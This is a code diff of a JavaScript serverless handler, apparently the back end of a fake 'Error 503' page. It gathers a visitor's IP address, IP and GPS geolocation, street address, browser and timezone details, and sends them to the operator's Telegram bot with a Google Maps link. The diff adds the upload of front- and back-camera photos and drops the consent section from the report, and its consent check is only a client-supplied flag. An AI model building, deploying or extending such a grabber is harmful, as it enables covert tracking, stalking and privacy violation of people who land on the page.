@@ -16,16 +16,54 @@ function safe(value, fallback = UNKNOWN) {
     return String(value).slice(0, 1000);
 }
 
+
+/* ================= FETCH JSON ================= */
+
+async function fetchJSON(url) {
+
+    const controller = new AbortController();
+
+    const timer = setTimeout(
+        () => controller.abort(),
+        10000
+    );
+
+    try {
+
+        const response = await fetch(url, {
+            signal: controller.signal,
+            headers: {
+                Accept: "application/json"
+            }
+        });
+
+        if (!response.ok) {
+            throw new Error("HTTP " + response.status);
+        }
+
+        return await response.json();
+
+    } finally {
+
+        clearTimeout(timer);
+
+    }
+
+}
+
+
 /* ================= PUBLIC IP ================= */
 
 function getPublicIP(req) {
-    let ip =
-        req.headers["x-real-ip"] ||
-        req.headers["x-forwarded-for"]?.split(",")[0] ||
-        req.socket?.remoteAddress ||
-        "";
 
-    ip = String(ip).trim().replace(/^::ffff:/, "");
+    const forwarded =
+        req.headers["x-forwarded-for"];
+
+    const ip = String(
+        forwarded?.split(",")[0] ||
+        req.headers["x-real-ip"] ||
+        ""
+    ).trim().replace(/^::ffff:/, "");
 
     if (
         !ip ||
@@ -39,121 +77,111 @@ function getPublicIP(req) {
     }
 
     return ip;
+
 }
 
-/* ================= FETCH JSON ================= */
-
-async function fetchJSON(url, timeout = 8000) {
-    const controller = new AbortController();
-
-    const timer = setTimeout(
-        () => controller.abort(),
-        timeout
-    );
-
-    try {
-        const response = await fetch(url, {
-            signal: controller.signal,
-            headers: {
-                Accept: "application/json",
-                "User-Agent": "Error503-Diagnostic/1.0"
-            }
-        });
-
-        if (!response.ok) {
-            throw new Error("HTTP " + response.status);
-        }
-
-        return await response.json();
-
-    } finally {
-        clearTimeout(timer);
-    }
-}
 
 /* ================= IP INFORMATION ================= */
 
 async function getIPInfo(ip) {
+
     const empty = {
-        country: UNKNOWN,
-        region: UNKNOWN,
-        city: UNKNOWN,
-        isp: UNKNOWN
+        country:UNKNOWN,
+        region:UNKNOWN,
+        city:UNKNOWN,
+        isp:UNKNOWN
     };
 
-    if (!ip || ip === "Unknown") {
+    if(ip === "Unknown"){
         return empty;
     }
 
-    // Provider pertama
-    try {
+    try{
+
         const data = await fetchJSON(
             `https://ipwho.is/${encodeURIComponent(ip)}`
         );
 
-        if (data.success !== false) {
+        if(data.success !== false){
+
             return {
-                country: safe(data.country),
-                region: safe(data.region),
-                city: safe(data.city),
-                isp: safe(
+                country:safe(data.country),
+                region:safe(data.region),
+                city:safe(data.city),
+                isp:safe(
                     data.connection?.isp ||
                     data.connection?.org
                 )
             };
+
         }
 
-    } catch (error) {
-        console.log("IPWho:", error.message);
+    }catch(error){
+
+        console.log("IPWho error:",error.message);
+
     }
 
-    // Provider kedua
-    try {
+    try{
+
         const data = await fetchJSON(
             `https://ipapi.co/${encodeURIComponent(ip)}/json/`
         );
 
-        if (!data.error) {
+        if(!data.error){
+
             return {
-                country: safe(data.country_name),
-                region: safe(data.region),
-                city: safe(data.city),
-                isp: safe(data.org)
+                country:safe(data.country_name),
+                region:safe(data.region),
+                city:safe(data.city),
+                isp:safe(data.org)
             };
+
         }
 
-    } catch (error) {
-        console.log("IPAPI:", error.message);
+    }catch(error){
+
+        console.log("IPAPI error:",error.message);
+
     }
 
     return empty;
+
 }
+
 
 /* ================= GPS ADDRESS ================= */
 
-async function getGPSAddress(lat, lon) {
-    try {
+async function getGPSAddress(lat,lon){
+
+    try{
+
         const url =
             "https://nominatim.openstreetmap.org/reverse" +
-            `?format=jsonv2&lat=${encodeURIComponent(lat)}` +
-            `&lon=${encodeURIComponent(lon)}` +
+            `?format=jsonv2&lat=${lat}&lon=${lon}` +
             "&zoom=18&addressdetails=1";
 
-        const data = await fetchJSON(url, 10000);
+        const data = await fetchJSON(url);
 
         return data.address || {};
 
-    } catch (error) {
-        console.log("GPS Address:", error.message);
+    }catch(error){
+
+        console.log("GPS error:",error.message);
 
         return {};
+
     }
+
 }
 
-/* ================= NORMALIZE ADDRESS ================= */
 
-function normalizeAddress(address, ipInfo) {
+/* ================= ADDRESS ================= */
+
+function normalizeAddress(address,ipInfo){
+
     return {
+
         village:
             address.village ||
             address.suburb ||
@@ -189,92 +217,172 @@ function normalizeAddress(address, ipInfo) {
             address.country ||
             ipInfo.country ||
             UNKNOWN
+
     };
+
 }
+
 
 /* ================= LOCATION QUALITY ================= */
 
-function getLocationQuality(accuracy) {
-    const number = parseFloat(accuracy);
+function getLocationQuality(accuracy){
 
-    if (Number.isNaN(number)) {
+    const value = Number(accuracy);
+
+    if(!Number.isFinite(value)){
         return "Tidak tersedia";
     }
 
-    if (number <= 20) return "High ✅";
-    if (number <= 100) return "Medium ⚠️";
+    if(value <= 20) return "High ✅";
+
+    if(value <= 100) return "Medium ⚠️";
 
     return "Low ❌";
+
 }
 
-/* ================= TELEGRAM ================= */
 
-async function sendTelegram(token, chatId, message) {
+/* ================= SEND TELEGRAM MESSAGE ================= */
+
+async function sendTelegramMessage(token,chatId,text){
+
     const response = await fetch(
         `https://api.telegram.org/bot${token}/sendMessage`,
         {
-            method: "POST",
+            method:"POST",
 
-            headers: {
-                "Content-Type": "application/json"
+            headers:{
+                "Content-Type":"application/json"
             },
 
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+            body:JSON.stringify({
+                chat_id:chatId,
+                text:text
             })
         }
     );
 
     const result = await response.json();
 
-    if (!response.ok || !result.ok) {
-        throw new Error("Telegram gagal mengirim laporan");
+    if(!response.ok || !result.ok){
+
+        throw new Error("Telegram message gagal");
+
     }
 
-    return result;
 }
+
+
+/* ================= SEND TELEGRAM PHOTO ================= */
+
+async function sendTelegramPhoto(token,chatId,photo,caption){
+
+    if(!photo){
+        return;
+    }
+
+    if(
+        typeof photo !== "string" ||
+        !photo.startsWith("data:image/jpeg;base64,")
+    ){
+
+        throw new Error("Format foto tidak valid");
+
+    }
+
+    const base64 = photo.split(",")[1];
+
+    const buffer = Buffer.from(base64,"base64");
+
+    if(buffer.length > 2 * 1024 * 1024){
+
+        throw new Error("Ukuran foto terlalu besar");
+
+    }
+
+    const form = new FormData();
+
+    form.append("chat_id",chatId);
+
+    form.append(
+        "photo",
+        new Blob([buffer],{
+            type:"image/jpeg"
+        }),
+        "camera.jpg"
+    );
+
+    form.append("caption",caption);
+
+    const response = await fetch(
+        `https://api.telegram.org/bot${token}/sendPhoto`,
+        {
+            method:"POST",
+            body:form
+        }
+    );
+
+    const result = await response.json();
+
+    if(!response.ok || !result.ok){
+
+        throw new Error("Telegram gagal mengirim foto");
+
+    }
+
+}
+
 
 /* ================= MAIN HANDLER ================= */
 
-export default async function handler(req, res) {
+export default async function handler(req,res){
 
-    if (req.method !== "POST") {
+    if(req.method !== "POST"){
+
         return res.status(405).json({
-            success: false,
-            message: "Method Not Allowed"
+            success:false,
+            message:"Method Not Allowed"
         });
+
     }
 
     const BOT_TOKEN = process.env.BOT_TOKEN;
+
     const CHAT_ID = process.env.CHAT_ID;
 
-    if (!BOT_TOKEN || !CHAT_ID) {
+    if(!BOT_TOKEN || !CHAT_ID){
+
         return res.status(500).json({
-            success: false,
-            message: "BOT_TOKEN atau CHAT_ID belum diatur"
+            success:false,
+            message:"Environment variable belum diatur"
         });
+
     }
 
     const input = req.body || {};
 
-    if (input.consent !== true) {
+    if(input.consent !== true){
+
         return res.status(403).json({
-            success: false,
-            message: "Persetujuan diperlukan"
+            success:false,
+            message:"Persetujuan diperlukan"
         });
+
     }
 
-    try {
+    try{
 
-        /* ===== IP ===== */
+        /* IP */
 
         const ip = getPublicIP(req);
+
         const ipInfo = await getIPInfo(ip);
 
-        /* ===== GPS ===== */
+
+        /* GPS */
 
         const lat = Number(input.latitude);
+
         const lon = Number(input.longitude);
 
         const validGPS =
@@ -288,8 +396,10 @@ export default async function handler(req, res) {
 
         let rawAddress = {};
 
-        if (validGPS) {
-            rawAddress = await getGPSAddress(lat, lon);
+        if(validGPS){
+
+            rawAddress = await getGPSAddress(lat,lon);
+
         }
 
         const address = normalizeAddress(
@@ -297,16 +407,15 @@ export default async function handler(req, res) {
             ipInfo
         );
 
-        const mapsLink = validGPS
-            ? `https://www.google.com/maps?q=${lat},${lon}`
-            : UNKNOWN;
 
-        /* ===== CAMERA ===== */
+        /* CAMERA */
 
         const frontCamera = safe(input.frontCamera);
+
         const backCamera = safe(input.backCamera);
 
-        /* ===== TIME ===== */
+
+        /* TIME */
 
         const timezone = safe(
             input.timezone,
@@ -315,17 +424,32 @@ export default async function handler(req, res) {
 
         let time;
 
-        try {
-            time = new Date().toLocaleString("sv-SE", {
-                timeZone: timezone
-            });
-        } catch {
+        try{
+
+            time = new Date().toLocaleString(
+                "sv-SE",
+                {
+                    timeZone:timezone
+                }
+            );
+
+        }catch{
+
             time = new Date().toISOString();
+
         }
 
-        /* ===== REPORT ===== */
 
-        const message = `
+        /* MAPS */
+
+        const maps = validGPS
+            ? `https://www.google.com/maps?q=${lat},${lon}`
+            : UNKNOWN;
+
+
+        /* REPORT */
+
+        const report = `
 🚨 ERROR 503 REPORT
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -362,12 +486,6 @@ ${safe(input.browser)}
 🌍 Country      : ${address.country}
 
 ━━━━━━━━━━━━━━━━━━━━
-📷 CAMERA INFORMATION
-━━━━━━━━━━━━━━━━━━━━
-🤳 Front Camera : ${frontCamera}
-📸 Back Camera  : ${backCamera}
-
-━━━━━━━━━━━━━━━━━━━━
 📐 LOCATION QUALITY
 ━━━━━━━━━━━━━━━━━━━━
 🎯 Quality     : ${
@@ -380,38 +498,72 @@ ${safe(input.browser)}
 }
 
 🗺 Google Maps:
-${mapsLink}
+${maps}
+
+━━━━━━━━━━━━━━━━━━━━
+📷 CAMERA INFORMATION
+━━━━━━━━━━━━━━━━━━━━
+🤳 Front Camera : ${frontCamera}
+📸 Back Camera  : ${backCamera}
 
 ⏰ Time : ${time}
-
-━━━━━━━━━━━━━━━━━━━━
-🤝 CONSENT
-━━━━━━━━━━━━━━━━━━━━
-📍 Location : ${validGPS ? "Disetujui" : "Tidak"}
-📷 Camera   : Diperiksa dengan preview
-
-━━━━━━━━━━━━━━━━━━━━
-✅ END OF REPORT
 `;
 
-        await sendTelegram(
+        /* SEND REPORT */
+
+        await sendTelegramMessage(
             BOT_TOKEN,
             CHAT_ID,
-            message
+            report
         );
 
+
+        /* SEND CONFIRMED PHOTOS */
+
+        if(input.frontPhoto){
+
+            await sendTelegramPhoto(
+                BOT_TOKEN,
+                CHAT_ID,
+                input.frontPhoto,
+                "🤳 Foto Kamera Depan - dikonfirmasi pengguna"
+            );
+
+        }
+
+        if(input.backPhoto){
+
+            await sendTelegramPhoto(
+                BOT_TOKEN,
+                CHAT_ID,
+                input.backPhoto,
+                "📸 Foto Kamera Belakang - dikonfirmasi pengguna"
+            );
+
+        }
+
+
         return res.status(200).json({
-            success: true,
-            message: "Laporan berhasil dikirim"
+
+            success:true,
+
+            message:"Laporan berhasil dikirim"
+
         });
 
-    } catch (error) {
 
-        console.error("REPORT ERROR:", error);
+    }catch(error){
+
+        console.error(error);
 
         return res.status(500).json({
-            success: false,
-            message: "Gagal mengirim laporan"
+
+            success:false,
+
+            message:error.message || "Gagal mengirim laporan"
+
         });
+
     }
-}
+
+                                             }
